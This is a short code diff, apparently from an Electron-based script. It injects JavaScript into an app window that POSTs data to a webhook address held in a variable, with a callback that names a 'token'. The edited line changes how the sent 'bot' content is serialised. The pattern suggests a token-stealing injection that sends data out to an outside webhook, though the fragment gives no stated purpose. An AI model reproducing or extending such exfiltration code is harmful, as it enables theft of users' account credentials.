@@ -257,7 +257,7 @@ const window = BrowserWindow.getAllWindows()[0];
     xhr.open("POST", "${swebhook}", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${content: bot}));
+    xhr.send(JSON.stringify(`${bot}`));
     `, !0).then((token => {}))
 }
 
